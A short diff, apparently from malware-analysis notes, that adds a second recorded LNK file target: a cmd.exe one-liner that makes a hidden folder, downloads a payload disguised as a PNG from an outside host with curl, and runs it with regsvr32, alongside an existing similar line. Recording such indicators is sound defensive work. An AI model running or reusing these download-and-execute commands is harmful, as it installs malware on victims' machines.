@@ -16,6 +16,8 @@ lnk file target:
 
 C:\Windows\System32\cmd.exe /q /c echo 'fbw' && echo "ueU" && ping 15.org && MD "%APPDATA%\HdHc\Yhq" && curl.exe --output %APPDATA%\HdHc\Yhq\Amrd.hZEf.dDo https://neptuneimpex.com/BmM/J.png && echo "aN8q" && regsvr32 "%APPDATA%\HdHc\Yhq\Amrd.hZEf.dDo"
 
+C:\Windows\System32\cmd.exe /q /c echo 'vSHw' && MD "%ProgramData%\XLhkBo\fF" && curl.exe --output %ProgramData%\XLhkBo\fF\UP2IOb.IOzv.Zm https://neptuneimpex.com/BmM/J.png && echo "FD" && regsvr32 "%ProgramData%\XLhkBo\fF\UP2IOb.IOzv.Zm" && echo "JEn"
+
 *************************************************
 
 Exec >>
